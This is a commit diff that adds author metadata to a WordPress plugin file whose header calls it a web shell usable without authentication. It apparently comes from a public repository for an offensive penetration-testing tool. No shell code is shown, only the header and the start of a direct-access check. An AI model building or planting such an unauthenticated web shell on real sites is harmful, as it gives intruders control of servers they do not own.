ef76a39b2070b4950e30e23c97839b0a849a25fd
XK3NF4 <207497148+XK3NF4@users.noreply.github.com>
2025-07-10 23:31:09 -0500

    Update wp_webshell.php

--- wp_webshell/wp_webshell.php
+++ wp_webshell/wp_webshell.php
@@ -5,6 +5,8 @@ Plugin URI: https://github.com/XK3NF4/webshell-plugin-wordpress
 Description: Web shell through a WordPress plugin without authentication.
 Version: 1.0.0
 Text Domain: webshell
+Author:XK3NF4
+Author URI:https://x.com/XK3NF4
 */
 
 if (realpath(__FILE__) === realpath($_SERVER['SCRIPT_FILENAME'])) {
